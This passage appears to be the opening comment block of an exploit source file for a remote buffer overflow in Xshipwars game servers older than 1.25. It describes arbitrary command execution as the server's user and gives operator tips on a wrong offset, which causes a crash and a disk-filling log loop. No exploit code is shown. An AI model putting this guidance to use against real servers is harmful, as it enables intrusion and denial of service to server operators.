Xshipwars a graphical 'star battle' client/server based game which runs a variety of platforms. Certain versions of the server which facilitates this game (versions before 1.25) had a remotely exploitable buffer overflow. The exploit would result in the execution of arbitrary commands as the UID of the server process.
*/

/* If the offset is off for your box, then the server will still crash,
 and will begin an endless loop of sending itself log messages,
 filling up whatever space it can on whatever partition it's installed
 on. This is less than optimal behavior, so quickly find and kill the
 server if your exploit fails.
